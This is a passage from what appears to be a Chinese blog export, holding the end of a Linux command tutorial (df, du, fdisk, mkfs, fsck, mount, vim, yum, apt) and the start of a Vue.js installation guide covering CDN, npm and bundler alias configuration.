<h2 id="df"><a href="#df" class="headerlink" title="df"></a>df</h2><p>df命令参数功能：检查文件系统的磁盘空间占用情况。可以利用该命令来获取硬盘被占用了多少空间，目前还剩下多少空间等信息。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df [-ahikHTm] [目录或文件名]</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-a ：列出所有的文件系统，包括系统特有的 /proc 等文件系统；<br>-k ：以 KBytes 的容量显示各文件系统；<br>-m ：以 MBytes 的容量显示各文件系统；<br>-h ：以人们较易阅读的 GBytes, MBytes, KBytes 等格式自行显示；<br>-H ：以 M=1000K 取代 M=1024K 的进位方式；<br>-T ：显示文件系统类型, 连同该 partition 的 filesystem 名称 (例如 ext3) 也列出；<br>-i ：不用硬盘容量，而以 inode 的数量来显示</p>
<h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例 1"></a>实例 1</h2><p>将系统内所有的文件系统列出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# df</span><br><span class="line">Filesystem      1K-blocks      Used Available Use% Mounted on</span><br><span class="line">/dev/hdc2         9920624   3823112   5585444  41% /</span><br><span class="line">/dev/hdc3         4956316    141376   4559108   4% /home</span><br><span class="line">/dev/hdc1          101086     11126     84741  12% /boot</span><br><span class="line">tmpfs              371332         0    371332   0% /dev/shm</span><br></pre></td></tr></table></figure>
<p>在 Linux 底下如果 df 没有加任何选项，那么默认会将系统内所有的 (不含特殊内存内的文件系统与 swap) 都以 1 Kbytes 的容量来列出来！</p>
<h2 id="实例-2"><a href="#实例-2" class="headerlink" title="实例 2"></a>实例 2</h2><p>将容量结果以易读的容量格式显示出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# df -h</span><br><span class="line">Filesystem            Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/hdc2             9.5G  3.7G  5.4G  41% /</span><br><span class="line">/dev/hdc3             4.8G  139M  4.4G   4% /home</span><br><span class="line">/dev/hdc1              99M   11M   83M  12% /boot</span><br><span class="line">tmpfs                 363M     0  363M   0% /dev/shm</span><br></pre></td></tr></table></figure>
<h2 id="实例-3"><a href="#实例-3" class="headerlink" title="实例 3"></a>实例 3</h2><p>将系统内的所有特殊文件格式及名称都列出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# df -aT</span><br><span class="line">Filesystem    Type 1K-blocks    Used Available Use% Mounted on</span><br><span class="line">/dev/hdc2     ext3   9920624 3823112   5585444  41% /</span><br><span class="line">proc          proc         0       0         0   -  /proc</span><br><span class="line">sysfs        sysfs         0       0         0   -  /sys</span><br><span class="line">devpts      devpts         0       0         0   -  /dev/pts</span><br><span class="line">/dev/hdc3     ext3   4956316  141376   4559108   4% /home</span><br><span class="line">/dev/hdc1     ext3    101086   11126     84741  12% /boot</span><br><span class="line">tmpfs        tmpfs    371332       0    371332   0% /dev/shm</span><br><span class="line">none   binfmt_misc         0       0         0   -  /proc/sys/fs/binfmt_misc</span><br><span class="line">sunrpc  rpc_pipefs         0       0         0   -  /var/lib/nfs/rpc_pipefs</span><br></pre></td></tr></table></figure>
<h2 id="实例-4"><a href="#实例-4" class="headerlink" title="实例 4"></a>实例 4</h2><p>将 /etc 底下的可用的磁盘容量以易读的容量格式显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# df -h /etc</span><br><span class="line">Filesystem            Size  Used Avail Use% Mounted on</span><br><span class="line">/dev/hdc2             9.5G  3.7G  5.4G  41% /</span><br></pre></td></tr></table></figure>
<h2 id="du"><a href="#du" class="headerlink" title="du"></a>du</h2><p>Linux du命令也是查看使用空间的，但是与df命令不同的是Linux du命令是对文件和目录磁盘使用的空间的查看，还是和df命令有一些区别的。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">du [-ahskm] 文件或目录名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-a ：列出所有的文件与目录容量，因为默认仅统计目录底下的文件量而已。<br>-h ：以人们较易读的容量格式 (G/M) 显示；<br>-s ：列出总量而已，而不列出每个各别的目录占用容量；<br>-S ：不包括子目录下的总计，与 -s 有点差别。<br>-k ：以 KBytes 列出容量显示；<br>-m ：以 MBytes 列出容量显示；</p>
<h2 id="实例-1-1"><a href="#实例-1-1" class="headerlink" title="实例 1"></a>实例 1</h2><p>只列出当前目录下的所有文件夹容量（包括隐藏文件夹）:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# du</span><br><span class="line">8       ./test4     &lt;==每个目录都会列出来</span><br><span class="line">8       ./test2</span><br><span class="line">....中间省略....</span><br><span class="line">12      ./.gconfd   &lt;==包括隐藏文件的目录</span><br><span class="line">220     .           &lt;==这个目录(.)所占用的总量</span><br></pre></td></tr></table></figure>
<p>直接输入 du 没有加任何选项时，则 du 会分析当前所在目录的文件与目录所占用的硬盘空间。</p>
<h2 id="实例-2-1"><a href="#实例-2-1" class="headerlink" title="实例 2"></a>实例 2</h2><p>将文件的容量也列出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# du -a</span><br><span class="line">12      ./install.log.syslog   &lt;==有文件的列表了</span><br><span class="line">8       ./.bash_logout</span><br><span class="line">8       ./test4</span><br><span class="line">8       ./test2</span><br><span class="line">....中间省略....</span><br><span class="line">12      ./.gconfd</span><br><span class="line">220     .</span><br></pre></td></tr></table></figure>
<h2 id="实例-3-1"><a href="#实例-3-1" class="headerlink" title="实例 3"></a>实例 3</h2><p>检查根目录底下每个目录所占用的容量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# du -sm /*</span><br><span class="line">7       /bin</span><br><span class="line">6       /boot</span><br><span class="line">.....中间省略....</span><br><span class="line">0       /proc</span><br><span class="line">.....中间省略....</span><br><span class="line">1       /tmp</span><br><span class="line">3859    /usr     &lt;==系统初期最大就是他了啦！</span><br><span class="line">77      /var</span><br></pre></td></tr></table></figure>
<p>通配符 * 来代表每个目录。</p>
<p>与 df 不一样的是，du 这个命令其实会直接到文件系统内去搜寻所有的文件数据。</p>
<h2 id="fdisk"><a href="#fdisk" class="headerlink" title="fdisk"></a>fdisk</h2><p>fdisk 是 Linux 的磁盘分区表操作工具。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk [-l] 装置名称</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-l ：输出后面接的装置所有的分区内容。若仅有 fdisk -l 时， 则系统将会把整个系统内能够搜寻到的装置的分区均列出来。</p>
<h2 id="实例-1-2"><a href="#实例-1-2" class="headerlink" title="实例 1"></a>实例 1</h2><p>列出所有分区信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@AY120919111755c246621 tmp]# fdisk -l</span><br><span class="line"></span><br><span class="line">Disk /dev/xvda: 21.5 GB, 21474836480 bytes</span><br><span class="line">255 heads, 63 sectors/track, 2610 cylinders</span><br><span class="line">Units = cylinders of 16065 * 512 = 8225280 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x00000000</span><br><span class="line"></span><br><span class="line">    Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/xvda1   *           1        2550    20480000   83  Linux</span><br><span class="line">/dev/xvda2            2550        2611      490496   82  Linux swap / Solaris</span><br><span class="line"></span><br><span class="line">Disk /dev/xvdb: 21.5 GB, 21474836480 bytes</span><br><span class="line">255 heads, 63 sectors/track, 2610 cylinders</span><br><span class="line">Units = cylinders of 16065 * 512 = 8225280 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disk identifier: 0x56f40944</span><br><span class="line"></span><br><span class="line">    Device Boot      Start         End      Blocks   Id  System</span><br><span class="line">/dev/xvdb2               1        2610    20964793+  83  Linux</span><br></pre></td></tr></table></figure>
<h2 id="实例-2-2"><a href="#实例-2-2" class="headerlink" title="实例 2"></a>实例 2</h2><p>找出你系统中的根目录所在磁盘，并查阅该硬盘内的相关信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@www ~]# df /            &lt;==注意：重点在找出磁盘文件名而已</span><br><span class="line">Filesystem           1K-blocks      Used Available Use% Mounted on</span><br><span class="line">/dev/hdc2              9920624   3823168   5585388  41% /</span><br><span class="line"></span><br><span class="line">[root@www ~]# fdisk /dev/hdc  &lt;==仔细看，不要加上数字喔！</span><br><span class="line">The number of cylinders for this disk is set to 5005.</span><br><span class="line">There is nothing wrong with that, but this is larger than 1024,</span><br><span class="line">and could in certain setups cause problems with:</span><br><span class="line">1) software that runs at boot time (e.g., old versions of LILO)</span><br><span class="line">2) booting and partitioning software from other OSs</span><br><span class="line">   (e.g., DOS FDISK, OS/2 FDISK)</span><br><span class="line"></span><br><span class="line">Command (m for help):     &lt;==等待你的输入！</span><br></pre></td></tr></table></figure>
<h2 id="磁盘格式化"><a href="#磁盘格式化" class="headerlink" title="磁盘格式化"></a>磁盘格式化</h2><p>磁盘分割完毕后自然就是要进行文件系统的格式化，格式化的命令非常的简单，使用 mkfs（make filesystem） 命令。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkfs [-t 文件系统格式] 装置文件名</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-t ：可以接文件系统格式，例如 ext3, ext2, vfat 等(系统有支持才会生效)</p>
<h2 id="磁盘检验"><a href="#磁盘检验" class="headerlink" title="磁盘检验"></a>磁盘检验</h2><p>fsck（file system check）用来检查和维护不一致的文件系统。</p>
<p>若系统掉电或磁盘发生问题，可利用fsck命令对文件系统进行检查。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fsck [-t 文件系统] [-ACay] 装置名称</span><br><span class="line">选项与参数：</span><br></pre></td></tr></table></figure>
<p>-t : 给定档案系统的型式，若在 /etc/fstab 中已有定义或 kernel 本身已支援的则不需加上此参数<br>-s : 依序一个一个地执行 fsck 的指令来检查<br>-A : 对/etc/fstab 中所有列出来的 分区（partition）做检查<br>-C : 显示完整的检查进度<br>-d : 打印出 e2fsck 的 debug 结果<br>-p : 同时有 -A 条件时，同时有多个 fsck 的检查一起执行<br>-R : 同时有 -A 条件时，省略 / 不检查<br>-V : 详细显示模式<br>-a : 如果检查有错则自动修复<br>-r : 如果检查有错则由使用者回答是否修复<br>-y : 选项指定检测每个文件是自动输入yes，在不确定那些是不正常的时候，可以执行 # fsck -y 全部检查修复。</p>
<h2 id="磁盘挂载与卸除"><a href="#磁盘挂载与卸除" class="headerlink" title="磁盘挂载与卸除"></a>磁盘挂载与卸除</h2><p>Linux 的磁盘挂载使用 mount 命令，卸载使用 umount 命令。</p>
<p>磁盘挂载语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount [-t 文件系统] [-L Label名] [-o 额外选项] [-n]  装置文件名  挂载点</span><br></pre></td></tr></table></figure>
<p>磁盘卸载命令 umount 语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">umount [-fn] 装置文件名或挂载点</span><br></pre></td></tr></table></figure>
<p>选项与参数：</p>
<p>-f ：强制卸除！可用在类似网络文件系统 (NFS) 无法读取到的情况下；<br>-n ：不升级 /etc/mtab 情况下卸除。</p>
<h1 id="Linux-vi-vim"><a href="#Linux-vi-vim" class="headerlink" title="Linux vi/vim"></a>Linux vi/vim</h1><p>所有的 Unix Like 系统都会内建 vi 文书编辑器，其他的文书编辑器则不一定会存在。</p>
<p>但是目前我们使用比较多的是 vim 编辑器。</p>
<p>vim 具有程序编辑的能力，可以主动的以字体颜色辨别语法的正确性，方便程序设计。</p>
<h2 id="什么是-vim？"><a href="#什么是-vim？" class="headerlink" title="什么是 vim？"></a>什么是 vim？</h2><p>Vim是从 vi 发展出来的一个文本编辑器。代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。</p>
<p>简单的来说， vi 是老式的字处理器，不过功能已经很齐全了，但是还是有可以进步的地方。 vim 则可以说是程序开发者的一项很好用的工具。</p>
<p><a href="https://www.runoob.com/linux/linux-vim.html" target="_blank" rel="noopener">vim 键盘图</a></p>
<h2 id="vi-vim-的使用"><a href="#vi-vim-的使用" class="headerlink" title="vi/vim 的使用"></a>vi/vim 的使用</h2><p>基本上 vi/vim 共分为三种模式，分别是命令模式（Command mode），输入模式（Insert mode）和底线命令模式（Last line mode）。 这三种模式的作用分别是：</p>
<h2 id="命令模式："><a href="#命令模式：" class="headerlink" title="命令模式："></a>命令模式：</h2><p>用户刚刚启动 vi/vim，便进入了命令模式。</p>
<p>此状态下敲击键盘动作会被Vim识别为命令，而非输入字符。比如我们此时按下i，并不会输入一个字符，i被当作了一个命令。</p>
<p>以下是常用的几个命令：</p>
<p>i 切换到输入模式，以输入字符。<br>x 删除当前光标所在处的字符。<br>: 切换到底线命令模式，以在最底一行输入命令。</p>
<p>若想要编辑文本：启动Vim，进入了命令模式，按下i，切换到输入模式。</p>
<p>命令模式只有一些最基本的命令，因此仍要依靠底线命令模式输入更多命令。</p>
<h2 id="输入模式"><a href="#输入模式" class="headerlink" title="输入模式"></a>输入模式</h2><p>在命令模式下按下i就进入了输入模式。</p>
<p>在输入模式中，可以使用以下按键：</p>
<ul>
<li>字符按键以及Shift组合，输入字符</li>
<li>ENTER，回车键，换行</li>
<li>BACK SPACE，退格键，删除光标前一个字符</li>
<li>DEL，删除键，删除光标后一个字符</li>
<li>方向键，在文本中移动光标</li>
<li>HOME/END，移动光标到行首/行尾</li>
<li>Page Up/Page Down，上/下翻页</li>
<li>Insert，切换光标为输入/替换模式，光标将变成竖线/下划线</li>
<li>ESC，退出输入模式，切换到命令模式</li>
</ul>
<h2 id="底线命令模式"><a href="#底线命令模式" class="headerlink" title="底线命令模式"></a>底线命令模式</h2><p>在命令模式下按下:（英文冒号）就进入了底线命令模式。</p>
<p>底线命令模式可以输入单个或多个字符的命令，可用的命令非常多。</p>
<p>在底线命令模式中，基本的命令有（已经省略了冒号）：</p>
<ul>
<li>q 退出程序</li>
<li>w 保存文件</li>
</ul>
<p>按ESC键可随时退出底线命令模式。</p>
<h2 id="vi-vim-使用实例"><a href="#vi-vim-使用实例" class="headerlink" title="vi/vim 使用实例"></a>vi/vim 使用实例</h2><p>使用 vi/vim 进入一般模式</p>
<p>如果你想要使用 vi 来建立一个名为 test.txt 的文件时，你可以这样做：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ vim runoob.txt</span><br></pre></td></tr></table></figure>
<p>直接输入 vi 文件名 就能够进入 vi 的一般模式了。</p>
<h2 id="按下-i-进入输入模式-也称为编辑模式"><a href="#按下-i-进入输入模式-也称为编辑模式" class="headerlink" title="按下 i 进入输入模式(也称为编辑模式)"></a>按下 i 进入输入模式(也称为编辑模式)</h2><p>在一般模式之中，只要按下 i, o, a 等字符就可以进入输入模式了！</p>
<p>在编辑模式当中，你可以发现在左下角状态栏中会出现 –INSERT- 的字样，那就是可以输入任意字符的提示。</p>
<p>这个时候，键盘上除了 Esc 这个按键之外，其他的按键都可以视作为一般的输入按钮了，所以你可以进行任何的编辑。</p>
<h2 id="按下-ESC-按钮回到一般模式"><a href="#按下-ESC-按钮回到一般模式" class="headerlink" title="按下 ESC 按钮回到一般模式"></a>按下 ESC 按钮回到一般模式</h2><p>好了，假设我已经按照上面的样式给他编辑完毕了，那么应该要如何退出呢？按下 Esc 这个按钮即可！马上你就会发现画面左下角的 – INSERT – 不见了！</p>
<h2 id="在一般模式中按下-wq-储存后离开-vi"><a href="#在一般模式中按下-wq-储存后离开-vi" class="headerlink" title="在一般模式中按下 :wq 储存后离开 vi"></a>在一般模式中按下 :wq 储存后离开 vi</h2><p>OK，我们要存档了，存盘并离开的指令很简单，输入 :wq 即可保存离开！</p>
<h2 id="vi-vim-按键说明"><a href="#vi-vim-按键说明" class="headerlink" title="vi/vim 按键说明"></a>vi/vim 按键说明</h2><p>除了上面简易范例的 i, Esc, :wq 之外，其实 vim 还有非常多的按键可以使用。</p>
<p>第一部份：一般模式可用的光标移动、复制粘贴、搜索替换等</p>
<p>第二部分：一般模式切换到编辑模式的可用的按钮说明</p>
<p>第三部分：一般模式切换到指令行模式的可用的按钮说明</p>
<p>参考：<a href="https://www.runoob.com/linux/linux-vim.html" target="_blank" rel="noopener">Linux vi/vim</a></p>
<h1 id="linux-yum-命令"><a href="#linux-yum-命令" class="headerlink" title="linux yum 命令"></a>linux yum 命令</h1><p>yum（ Yellow dog Updater, Modified）是一个在Fedora和RedHat以及SUSE中的Shell前端软件包管理器。</p>
<p>基於RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。</p>
<p>yum提供了查找、安装、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。</p>
<p>参考<a href="https://www.runoob.com/linux/linux-yum.html" target="_blank" rel="noopener">Linux yum 命令</a></p>
<h1 id="Linux-apt-命令"><a href="#Linux-apt-命令" class="headerlink" title="Linux apt 命令"></a>Linux apt 命令</h1><p>apt（Advanced Packaging Tool）是一个在 Debian 和 Ubuntu 中的 Shell 前端软件包管理器。</p>
<p>apt 命令提供了查找、安装、升级、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。</p>
<p>apt 命令执行需要超级管理员权限(root)。</p>
<p>参考</p>
<p><a href="https://www.runoob.com/linux/linux-comm-apt.html" target="_blank" rel="noopener">Linux apt 命令</a></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.runoob.com/linux/linux-tutorial.html" target="_blank" rel="noopener">linux教程|菜鸟教程</a></li>
</ul>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>vue教程</title>
    <url>/2019/08/01/vue%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h2><p>Vue 不支持 IE8 及以下版本，因为 Vue 使用了 IE8 无法模拟的 ECMAScript 5 特性。但它支持所有兼容 ECMAScript 5 的浏览器。</p>
<a id="more"></a>
<h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><p>最新稳定版本：2.6.10</p>
<p>每个版本的更新日志见 GitHub。</p>
<h2 id="Vue-Devtools"><a href="#Vue-Devtools" class="headerlink" title="Vue Devtools"></a>Vue Devtools</h2><p>在使用 Vue 时，我们推荐在你的浏览器上安装 Vue Devtools。它允许你在一个更友好的界面中审查和调试 Vue 应用。</p>
<h2 id="直接用-lt-script-gt-引入"><a href="#直接用-lt-script-gt-引入" class="headerlink" title="直接用 &lt;script&gt; 引入"></a>直接用 <code>&lt;script&gt;</code> 引入</h2><p>直接下载并用 <code>&lt;script&gt;</code> 标签引入，Vue 会被注册为一个全局变量。</p>
<p>在开发环境下不要使用压缩版本，不然你就失去了所有常见错误相关的警告!</p>
<p><a href="https://cn.vuejs.org/js/vue.js" target="_blank" rel="noopener">开发版本</a> 包含完整的警告和调试模式<br><a href="https://cn.vuejs.org/js/vue.min.js" target="_blank" rel="noopener">生成版本</a> 删除了警告，33.30KB min+gzip</p>
<h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p>对于制作原型或学习，你可以这样使用最新版本：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>对于生产环境，我们推荐链接到一个明确的版本号和构建文件，以避免新版本造成的不可预期的破坏：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue@2.6.10/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>如果你使用原生 ES Modules，这里也有一个兼容 ES Module 的构建文件：<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"module"</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'https://cdn.jsdelivr.net/npm/vue@2.6.10/dist/vue.esm.browser.js'</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>你可以在 cdn.jsdelivr.net/npm/vue 浏览 NPM 包的源代码。</p>
<p>Vue 也可以在 unpkg 和 cdnjs 上获取 (cdnjs 的版本更新可能略滞后)。</p>
<p>请确认了解不同构建版本并在你发布的站点中使用生产环境版本，把 vue.js 换成 vue.min.js。这是一个更小的构建，可以带来比开发环境下更快的速度体验。</p>
<h2 id="NPM"><a href="#NPM" class="headerlink" title="NPM"></a>NPM</h2><p>在用 Vue 构建大型应用时推荐使用 NPM 安装[1]。NPM 能很好地和诸如 webpack 或 Browserify 模块打包器配合使用。同时 Vue 也提供配套工具来开发单文件组件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 最新稳定版</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> npm install vue</span></span><br></pre></td></tr></table></figure>
<h2 id="命令行工具-CLI"><a href="#命令行工具-CLI" class="headerlink" title="命令行工具 (CLI)"></a>命令行工具 (CLI)</h2><p>Vue 提供了一个官方的 CLI，为单页面应用 (SPA) 快速搭建繁杂的脚手架。它为现代前端工作流提供了 batteries-included 的构建设置。只需要几分钟的时间就可以运行起来并带有热重载、保存时 lint 校验，以及生产环境可用的构建版本。更多详情可查阅 Vue CLI 的文档。</p>
<p>CLI 工具假定用户对 Node.js 和相关构建工具有一定程度的了解。如果你是新手，我们强烈建议先在不用构建工具的情况下通读指南，在熟悉 Vue 本身之后再使用 CLI。</p>
<h2 id="对不同构建版本的解释"><a href="#对不同构建版本的解释" class="headerlink" title="对不同构建版本的解释"></a>对不同构建版本的解释</h2><p>在 NPM 包的 dist/ 目录你将会找到很多不同的 Vue.js 构建版本。这里列出了它们之间的差别：</p>
<p><img src="https://mfaying.github.io/static/images/vue/1.jpg" alt="avatar"></p>
<p><img src="https://mfaying.github.io/static/images/vue/2.jpg" alt="avatar"></p>
<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><ol>
<li><p>完整版：同时包含编译器和运行时的版本。</p>
</li>
<li><p>编译器：用来将模板字符串编译成为 JavaScript 渲染函数的代码。</p>
</li>
<li><p>运行时：用来创建 Vue 实例、渲染并处理虚拟 DOM 等的代码。基本上就是除去编译器的其它一切。</p>
</li>
<li><p>UMD：UMD 版本可以通过 <code>&lt;script&gt;</code> 标签直接用在浏览器中。jsDelivr CDN 的 <a href="https://cdn.jsdelivr.net/npm/vue" target="_blank" rel="noopener">https://cdn.jsdelivr.net/npm/vue</a> 默认文件就是运行时 + 编译器的 UMD 版本 (vue.js)。</p>
</li>
<li><p>CommonJS：CommonJS 版本用来配合老的打包工具比如 Browserify 或 webpack 1。这些打包工具的默认文件 (pkg.main) 是只包含运行时的 CommonJS 版本 (vue.runtime.common.js)。</p>
</li>
<li><p>ES Module：从 2.6 开始 Vue 会提供两个 ES Modules (ESM) 构建文件：</p>
</li>
</ol>
<p>为打包工具提供的 ESM：为诸如 webpack 2 或 Rollup 提供的现代打包工具。ESM 格式被设计为可以被静态分析，所以打包工具可以利用这一点来进行“tree-shaking”并将用不到的代码排除出最终的包。为这些打包工具提供的默认文件 (pkg.module) 是只有运行时的 ES Module 构建 (vue.runtime.esm.js)。</p>
<p>为浏览器提供的 ESM (2.6+)：用于在现代浏览器中通过 <code>&lt;script type=&quot;module&quot;&gt;</code> 直接导入。</p>
<h2 id="运行时-编译器-vs-只包含运行时"><a href="#运行时-编译器-vs-只包含运行时" class="headerlink" title="运行时 + 编译器 vs. 只包含运行时"></a>运行时 + 编译器 vs. 只包含运行时</h2><p>如果你需要在客户端编译模板 (比如传入一个字符串给 template 选项，或挂载到一个元素上并以其 DOM 内部的 HTML 作为模板)，就将需要加上编译器，即完整版：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 需要编译器</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  template: &apos;&lt;div&gt;&#123;&#123; hi &#125;&#125;&lt;/div&gt;&apos;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// 不需要编译器</span><br><span class="line">new Vue(&#123;</span><br><span class="line">  render (h) &#123;</span><br><span class="line">    return h(&apos;div&apos;, this.hi)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>当使用 vue-loader 或 vueify 的时候，*.vue 文件内部的模板会在构建时预编译成 JavaScript。你在最终打好的包里实际上是不需要编译器的，所以只用运行时版本即可。</p>
<p>因为运行时版本相比完整版体积要小大约 30%，所以应该尽可能使用这个版本。如果你仍然希望使用完整版，则需要在打包工具里配置一个别名：</p>
<p>webpack<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      <span class="string">'vue$'</span>: <span class="string">'vue/dist/vue.esm.js'</span> <span class="comment">// 用 webpack 1 时需用 'vue/dist/vue.common.js'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Rollup<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> alias = <span class="built_in">require</span>(<span class="string">'rollup-plugin-alias'</span>)</span><br><span class="line"></span><br><span class="line">rollup(&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  plugins: [</span><br><span class="line">    alias(&#123;</span><br><span class="line">      <span class="string">'vue'</span>: <span class="built_in">require</span>.resolve(<span class="string">'vue/dist/vue.esm.js'</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
<p>Browserify<br>添加到你项目的 package.json：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="string">"browser"</span>: &#123;</span><br><span class="line">    <span class="string">"vue"</span>: <span class="string">"vue/dist/vue.common.js"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Parcel<br>在你项目的 package.json 中添加：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="string">"alias"</span>: &#123;</span><br><span class="line">    <span class="string">"vue"</span> : <span class="string">"./node_modules/vue/dist/vue.common.js"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="开发环境-vs-生产环境模式"><a href="#开发环境-vs-生产环境模式" class="headerlink" title="开发环境 vs. 生产环境模式"></a>开发环境 vs. 生产环境模式</h2><p>对于 UMD 版本来说，开发环境/生产环境模式是硬编码好的：开发环境下用未压缩的代码，生产环境下使用压缩后的代码。</p>
<p>CommonJS 和 ES Module 版本是用于打包工具的，因此我们不提供压缩后的版本。你需要自行将最终的包进行压缩。</p>
<p>CommonJS 和 ES Module 版本同时保留原始的 process.env.NODE_ENV 检测，以决定它们应该运行在什么模式下。你应该使用适当的打包工具配置来替换这些环境变量以便控制 Vue 所运行的模式。把 process.env.NODE_ENV 替换为字符串字面量同时可以让 UglifyJS 之类的压缩工具完全丢掉仅供开发环境的代码块，以减少最终的文件尺寸。</p>
<p>webpack<br>在 webpack 4+ 中，你可以使用 mode 选项：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'production'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>但是在 webpack 3 及其更低版本中，你需要使用 DefinePlugin：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">new</span> webpack.DefinePlugin(&#123;</span><br><span class="line">      <span class="string">'process.env'</span>: &#123;</span><br><span class="line">        NODE_ENV: <span class="built_in">JSON</span>.stringify(<span class="string">'production'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
